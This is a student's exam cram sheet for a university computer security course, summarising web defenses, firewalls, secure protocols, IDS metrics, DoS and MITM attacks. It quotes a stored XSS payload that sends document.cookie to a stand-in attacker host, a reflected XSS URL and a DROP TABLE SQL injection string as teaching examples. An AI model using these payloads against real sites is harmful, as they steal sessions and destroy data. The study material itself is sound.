---
tags:
  - university
  - bcs2420
  - computer-security
  - cram-sheet
---

# 05 Web and Network Defense Cram Sheet

Morning-of-exam scan sheet. Dense facts, formulas, acronyms.

## Web Architecture Basics

- URL = `scheme://host[:port]/path?query`.
- **DOM** = Document Object Model — browser's in-memory page tree.
- Browser = execution environment (not just renderer).

## Same-Origin Policy (SOP)

- Origin = (scheme, host, port). All three must match.
- `https://a.example.com` and `http://a.example.com` = different origins (different scheme).
- Sharing `.com` does NOT make pages same-origin.

## Cookies — Flags

| Attribute | Effect |
|---|---|
| `Secure` | Sent only over HTTPS |
| `HttpOnly` | Inaccessible to JavaScript (`document.cookie`) — mitigates cookie-theft XSS |
| `SameSite=Lax/Strict` | Not sent cross-site automatically — mitigates CSRF |
| `Domain` | Which hosts get the cookie (e.g. `.example.com` = all subdomains) |
| `Path` | Which URL path the cookie applies to |

## Mixed Content / document.domain / Cookie Scope

- **Mixed content** — HTTPS page loading HTTP subresource → attacker can tamper with insecure dep.
- **document.domain** — explicit SOP relaxation between subdomains sharing parent.
- **Broad cookie scope** (`Domain=.example.com`) — exposes session to every subdomain; one weak subdomain compromises whole site.

## XSS — 3 Types

| Type | Where payload lives | When it runs | Victim |
|---|---|---|---|
| **Stored** | Saved in app's DB | On every visit to affected page | Any visitor |
| **Reflected** | In URL/form param of single request | When victim submits crafted request | The lured user only |
| **DOM-based** | Constructed entirely in client JS | When unsafe JS inserts untrusted data into DOM | Any user triggering the JS path |

- **Stored XSS payload**: `<script>fetch('https://attacker/?c='+document.cookie)</script>` saved as a comment.
- **Reflected XSS**: phishing URL with `?q=<script>...</script>` reflected in error page.

## XSS Defenses

- Output encoding / sanitization.
- `HttpOnly` cookies (block JS reading session cookies).
- **Content Security Policy (CSP)** — see below.

## CSP — Key Directives

| Directive | Controls |
|---|---|
| `default-src` | Fallback for all types |
| `script-src` | JS sources |
| `style-src` | CSS sources |
| `img-src` | Image sources |
| `connect-src` | AJAX/fetch/WebSocket targets |
| `frame-src` | Allowed iframes |
| `report-uri` | Where to send CSP violation reports |

- `script-src 'self'` blocks inline scripts and external scripts from unauthorised origins.
- `script-src 'nonce-abc123'` → only `<script nonce="abc123">` executes; attacker doesn't know the per-request nonce.
- **Crucial**: CSP does NOT prevent **injection** — it prevents **execution** of the injected script.

## CSRF

- **Mechanism**: attacker tricks victim's browser into sending an authenticated request to a site where the victim is logged in. Browser auto-attaches cookies → server treats as legitimate.
- **Defenses**: anti-CSRF tokens (per-request, validated server-side), `SameSite` cookies, re-authenticate for sensitive actions.

## SQL Injection

- **Vulnerable**: string concatenation → `"... WHERE name='" + input + "'"`. Malicious input `'; DROP TABLE users; --` breaks out.
- **Defense**: **Prepared statements** — placeholder `?`/`:name`/`$1`. Driver sends SQL syntax and parameters separately; input is never interpreted as SQL.
- Manual escaping is fragile (multibyte encoding bugs, identifier/numeric contexts).
- **Exam rule**: separate code from data.

## Secure File Upload — Checklist (≥3 measures for exam)

1. Validate **MIME type + extension** server-side (don't trust browser's `Content-Type`).
2. **Rename file** server-side (random name, no path-traversal risk).
3. Store **outside webroot** (cannot be served as executable URL).
4. Serve with **correct Content-Type** (no MIME sniffing).
5. **Scan for malicious content** (AV, image sanitization, strip EXIF, re-encode).
6. **Enforce size limits** (avoid upload DoS).

## Firewalls — 4 Types

| Type | Inspects | Notes |
|---|---|---|
| **Packet filter (stateless)** | Headers only | Each packet independent |
| **Stateful** | Headers + connection state | Allows return traffic matching known flows |
| **Proxy firewall** | Application-layer content (full relay) | Can inspect/enforce protocol |
| **Application firewall (WAF)** | App-specific semantics | e.g., HTTP method, payload patterns |

## Default-Allow vs Default-Deny — Failure Modes

| | Default-Deny | Default-Allow |
|---|---|---|
| Style | Allowlist | Denylist |
| Failure mode | **Service breakage** (visible, recoverable) | **Silent unauthorized access** (invisible, unrecoverable) |
| Verdict | Safer (fails closed) | Riskier (fails open) |

- Lecture 7 calls default-deny the principle of **SAFE-DEFAULTS**.

## Firewall Architectures (progression)

1. **Single screening router** — basic.
2. **Screening router + bastion host** — hardened exposed boundary.
3. **DMZ with two screening routers (or dual-homed host)** — standard enterprise. Public services in DMZ, internal hosts behind a second filter.

## DMZ + Bastion + Dual-homed

- **DMZ** = isolated network segment for public-facing services (web, DNS) so compromise doesn't reach internal network.
- **Bastion host** = deliberately hardened exposed system; non-essential services disabled; narrow attack surface.
- **Dual-homed host** = a host with two NICs serving as a controlled bridge between zones (alternative to two routers).

## Port Knocking

- Service hidden until correct sequence of connection attempts observed.
- Reduces scanning visibility; **NOT a substitute** for real auth/encryption.

## SSH (Application layer)

- 3 sub-protocols:
  1. **Transport** — encryption + integrity.
  2. **Authentication** — client identity.
  3. **Connection** — multiplexes sessions and port forwards.
- **3 client auth methods**: client password, Kerberos ticket, client public key (modern preferred).
- **2 server auth trust models**: local known_hosts DB (TOFU); CA-certified host keys.
- Replaces: rsh, rlogin, telnet, ftp, rcp (→ ssh, sftp/ftps, scp).
- **Port forwarding**:
  - **Local** (`-L`) — local port → remote dest through tunnel.
  - **Remote** (`-R`) — server port → local dest through tunnel.
  - **Dynamic** (`-D`) — SOCKS proxy.

## TLS / IPsec / SSH — Stack Placement (memorize)

| Protocol | Layer | Protects |
|---|---|---|
| **TLS** | Transport | One application connection (e.g., HTTPS) |
| **IPsec** | Network | All IP traffic between endpoints |
| **SSH** | Application | One SSH connection (can tunnel others) |

- Memory: **TLS = transport, IPsec = network, SSH = application**.

## VPN Modes

- **Tunnel mode** — encapsulates full IP packet inside outer packet.
- **Transport mode** — protects payload, leaves original IP header.

## IDS vs IPS / HIDS vs NIDS

| | Function |
|---|---|
| **IDS** | Detects + alerts |
| **IPS** | Detects + actively blocks/responds |
| **HIDS** | Host-based — logs, files, kernel events |
| **NIDS** | Network-based — packets at strategic taps |

## Detection Models

| Model | Detects | Strength | Weakness |
|---|---|---|---|
| **Signature** | Known patterns | Precise for known | Blind to novel |
| **Anomaly** | Deviations from learned normal | Catches unknown | High FPR; baseline drift |
| **Specification** | Explicit allowed-behaviour rules | Predictable | Heavy upfront spec work |

## IDS Confusion Matrix

|  | intrusion present | no intrusion |
|---|---|---|
| **alarm raised** | TP | FP |
| **no alarm raised** | FN | TN |

## IDS Formulas (memorize)

```text
TPR (detection rate) = TP / (TP + FN)
FPR (false alarm)    = FP / (FP + TN)
AP  (alarm precision) = TP / (TP + FP)
TNR = 1 - FPR
FNR = 1 - TPR
```

## Base-Rate Drill Template

```text
Given: TPR, FPR, base rate, total events N
1. Real intrusions = base_rate × N
2. Benign events   = N - real_intrusions
3. TP = TPR × real_intrusions
4. FP = FPR × benign_events
5. AP = TP / (TP + FP)
```

- Worked: TPR=95%, FPR=1%, 1 in 10,000 base, N=100,000 → 10 attacks, ~9 TP, ~1000 FP → AP ≈ 0.9%.
- Worked: TPR=90%, FPR=2%, 200 real / 10,000 benign → 20 FN, 200 FP.

## DoS Bandwidth Conversion

```text
bytes/s = pps × bytes_per_packet
bits/s  = bytes/s × 8
Mbps    = bits/s / 1,000,000
```

- Worked: 100,000 pps × 512 B × 8 = 409.6 Mbps → saturates 100 Mbps link.

## Packet Sniffing & Promiscuous Mode

- **Promiscuous mode** = NIC accepts all observed traffic for inspection.
- Does **NOT** override switch decisions — switched LANs only forward relevant frames.
- NIDS visibility depends on **placement** (mirror ports, taps, gateway).

## SYN Flooding + SYN Cookies

- **SYN flood**: attacker sends many SYNs with spoofed source IPs; server allocates half-open conn entries; table fills; legit connections rejected.
- TCP handshake: SYN → SYN-ACK → ACK. Attacker never sends final ACK.
- **SYN cookies** mitigation: server encodes connection state into the ISN of SYN-ACK via cryptographic hash → no table entry allocated. State reconstructed only if real ACK arrives.
- SYN cookies do NOT stop the flood — they prevent resource exhaustion.
- Cost: some TCP options (window scaling) can't be preserved.

## Smurf + Amplification

- **Smurf**: attacker sends ICMP echo (ping) with spoofed source = victim, to subnet broadcast addr → all N hosts reply to victim. Amplification factor = N.
- Mitigations: routers block directed broadcasts; **BCP38 ingress filtering** drops spoofed source IPs at ISP.
- Generalises to **DRDoS** (DNS, NTP `monlist`, SSDP, Memcached) — stateless UDP + spoofable source + large response.

## DDoS Basics

- **D**istributed Denial of Service — many sources flood target.
- Hard to distinguish from flash crowd at first glance.
- FP vs FN both matter (high FN = silent compromise).

## ARP Spoofing + Mitigations

- Forged ARP reply maps victim's gateway IP → attacker's MAC. Victim's traffic flows through attacker.
- Scope: local subnet only.
- Mitigations:
  - **Static ARP entries** (high maintenance).
  - **802.1X port-based auth** (need modern switches + supplicants).
  - **Dynamic ARP Inspection (DAI)** + DHCP snooping (switch validates ARP against trusted bindings).

## DNS Cache Poisoning + Mitigations

- Inject false A/AAAA mapping into resolver cache → users redirected to attacker's IP.
- Attacker races to send forged response matching transaction ID and source port before real reply.
- Mitigations:
  - **Source-port randomisation** (raises entropy ~16 bits).
  - **Transaction-ID randomisation** (16-bit unpredictable).
  - **0x20 encoding** (random case mixing in query name).
  - **DNSSEC** — cryptographic signatures; only one that defeats the attack outright.

## MITM Scenario Taxonomy (4 layers)

| Layer | Variant | Diagnostic clue |
|---|---|---|
| **Link (LAN)** | ARP spoofing | "Forged ARP reply" / "gateway IP → attacker MAC" |
| **Name resolution** | DNS cache poisoning | "Resolver cache" / "false name-to-IP mapping" |
| **Wireless link** | Rogue AP | "Impersonated SSID" / "STA associates with attacker AP" |
| **Wireless link** | Disassociation hijack | "Disassociate frame with AP's MAC" |
| **Transport** | SSL strip / HTTPS downgrade | "Rewrites HTTPS to HTTP" |
| **Transport** | **Key-exchange substitution** | **"Intercepts public keys during key exchange"** ← past-exam wording |

- Key-exchange MITM defense: **authenticated key exchange** (signed public values, certs, OOB verification).
- Encryption alone does NOT defeat MITM if the key exchange is unauthenticated.

## WLAN — 802.11 Quick Card

| Term | Meaning |
|---|---|
| **STA** | Station (client device) |
| **AP** | Access Point |
| **AS** | Authentication Server (enterprise 802.1X) |
| **DS** | Distribution System (wired backbone) |
| **SSID** | Network name (≤32 chars, plaintext in beacons) |
| **BSSID** | AP's MAC address |
| **ESSID** | Identifier for an Extended Service Set |
| **BSS** | One AP + its STAs |
| **ESS** | Multiple BSSs sharing ESSID |
| **IBSS** | Ad-hoc, no AP |

- 3 frame types: **data, management, control**. Management frames (beacons, probes, disassociate) are NOT cryptographically authenticated in original 802.11 → many attacks.
- 802.11 = Wi-Fi; 802.3 = Ethernet.

## Rogue AP

- Attacker stands up AP with same SSID + advertised policy as legitimate.
- No mutual auth → STA associates with rogue.
- Rogue relays to real AP → MITM.

## Disassociation Hijack

1. STA authenticates and associates with real AP.
2. Attacker spoofs disassociate frame with **AP's MAC** to STA → STA drops.
3. Attacker spoofs **STA's MAC** to AP → continues session.

- Two MAC addresses spoofed at different stages.

## WLAN Encryption Limitation

- Link-layer encryption protects **only STA-to-AP hop**.
- AP decrypts; wired side is cleartext unless end-to-end (TLS) added.
- Shared keys in public hotspots → any peer can decrypt other peers' traffic.
- Loss of physical-presence assumption is the fundamental wireless shift.

## IDS Evasion (Tut L8 B Q10)

- **Fragmentation** — split payload across IP/TCP fragments; naive IDS misses. **Counter**: full stream reassembly.
- **Polymorphic shellcode / encoded payload** — XOR-encode shellcode + decoder stub. **Counter**: emulation/sandboxing; behaviour-based detection.
- Other: protocol ambiguity, slow-rate attacks, encryption (HTTPS).

## Vulnerability Scanners (Nessus etc.)

- Workflow: discovery → service ID → plugin-based CVE testing → CVSS-scored report.
- Limitations: zero-days invisible; false positives from version banners (backports); disruption risk; credentialed vs uncredentialed scans.

## Common Pitfalls

- Assuming HTTPS alone defeats CSRF/XSS.
- Calling CSRF a script-injection attack.
- Saying CSP prevents injection (it prevents execution).
- Thinking promiscuous mode gives full switched-LAN visibility.
- Saying SYN cookies prevent the flood (they prevent resource exhaustion).
- Confusing Smurf (ICMP broadcast) with DNS amplification (same principle, different protocol).
- Forgetting bits-vs-bytes (×8) in DoS calculations.
- Mixing TPR's denominator (real intrusions) with FPR's denominator (benign events).
- Saying "the IDS is 95% accurate → 95% of alarms correct" (AP depends on base rate).
- Believing encryption alone defeats MITM (unauth key exchange leaves it open).
- Treating MITM as one attack — exam expects the layer + mechanism named.
